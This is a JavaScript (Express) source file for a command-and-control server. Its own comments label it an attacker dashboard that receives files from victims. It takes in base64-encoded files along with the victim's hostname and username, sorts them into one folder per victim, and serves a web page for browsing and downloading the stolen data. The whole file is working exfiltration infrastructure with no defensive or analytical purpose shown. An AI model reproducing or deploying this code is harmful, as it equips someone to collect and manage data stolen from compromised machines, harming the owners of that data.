const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json({ limit: "100mb" }));

const VICTIMS_DIR = "victims";
if (!fs.existsSync(VICTIMS_DIR)) fs.mkdirSync(VICTIMS_DIR);

// attacker dashboard
app.get("/", (req, res) => {
  const victims = fs.existsSync(VICTIMS_DIR) ? fs.readdirSync(VICTIMS_DIR) : [];
  res.send(`
    <h2>Server — ${victims.length} victims</h2>
    <ul>${victims.map(v => `<li><a href="/victim/${v}">${v}</a></li>`).join("")}</ul>
  `);
});

// receive files from victim
app.post("/send", (req, res) => {
  const { hostname, username, files } = req.body;

  // create folder per victim
  const victimDir = path.join(VICTIMS_DIR, `${hostname}_${username}`);
  if (!fs.existsSync(victimDir)) fs.mkdirSync(victimDir, { recursive: true });

  // save each file
  if (files) {
    files.forEach(({ name, content }) => {
      fs.writeFileSync(path.join(victimDir, name), Buffer.from(content, "base64"));
    });
  }

  // save metadata
  fs.writeFileSync(path.join(victimDir, "info.json"), JSON.stringify({ hostname, username, time: new Date() }, null, 2));

  console.log(`[+] ${files?.length || 0} files received from ${hostname}`);
  res.json({ success: true });
});

// browse victim folder
app.get("/victim/:id", (req, res) => {
  const victimDir = path.join(VICTIMS_DIR, req.params.id);
  if (!fs.existsSync(victimDir)) return res.status(404).send("Not found");
  const files = fs.readdirSync(victimDir);
  res.send(`
    <h2>Victim: ${req.params.id}</h2>
    <ul>${files.map(f => `<li><a href="/victim/${req.params.id}/${f}">${f}</a></li>`).join("")}</ul>
  `);
});

// download individual file
app.get("/victim/:id/:file", (req, res) => {
  const filePath = path.join(VICTIMS_DIR, req.params.id, req.params.file);
  if (!fs.existsSync(filePath)) return res.status(404).send("Not found");
  res.download(filePath);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, "0.0.0.0", () => console.log(`C2 running on port ${PORT}`));